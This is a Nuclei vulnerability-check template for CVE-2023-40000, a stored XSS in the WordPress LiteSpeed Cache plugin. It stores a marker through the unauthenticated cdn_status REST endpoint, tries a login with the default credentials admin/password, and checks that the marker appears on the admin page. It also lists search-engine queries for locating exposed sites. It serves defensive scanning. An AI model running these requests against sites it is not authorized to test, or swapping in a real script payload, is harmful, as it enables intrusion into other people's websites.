id: CVE-2023-40000

info:
  name: LiteSpeed Cache <= 5.7 - Priv Esc via Stored XSS
  author: 0x_Akoko
  severity: high
  description: |
    The plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'nameservers' and '_msg' parameters due to insufficient input sanitization and output escaping, allowing unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
  reference:
    - https://wpscan.com/vulnerability/dd9054cc-1259-427d-a4ad-1875b7b2b3b4
    - https://wordpress.org/plugins/litespeed-cache
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id: CVE-2023-40000
  metadata:
    fofa-query: "wp-content/plugins/litespeed-cache/"
    google-query: inurl:"/wp-content/plugins/litespeed-cache/"
    shodan-query: 'vuln:CVE-2023-40000'
  tags: cve,wordpress,wp-plugin,litespeed-cache,high

variables:
  marker: "NUCLEI_LSCACHE_{{randstr}}"
  wp_user: "admin"
  wp_pass: "password"

flow: |
  ( http("version-report") || true ) &&
  http("store-marker") &&
  http("login") &&
  http("verify-admin")

http:
  - id: version-report
    raw:
      - |
        GET /wp-content/plugins/litespeed-cache/readme.txt HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - compare_versions(ver, "< 5.7.0.1")
    extractors:
      - type: regex
        name: ver
        internal: true
        group: 1
        part: body
        regex:
          - '(?im)^(?:Stable tag|Version)\s*:\s*([0-9.]+)\s*$'
      - type: regex
        name: detected_version
        group: 1
        part: body
        regex:
          - '(?im)^(?:Stable tag|Version)\s*:\s*([0-9.]+)\s*$'

  - id: store-marker
    raw:
      - |
        POST /wp-json/litespeed/v1/cdn_status HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: "Mozilla/5.0 Nuclei"

        success=0&result[_msg]={{marker}}
    redirects: true

  - id: login
    raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 Nuclei

        log={{wp_user}}&pwd={{wp_pass}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
    redirects: true
    max-redirects: 3

  - id: verify-admin
    raw:
      - |
        GET /wp-admin/admin.php?page=litespeed-cdn HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 Nuclei
        Accept: text/html
        Cache-Control: no-cache
        Pragma: no-cache
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, "{{marker}}")
          - contains(body, "LiteSpeed Cache")
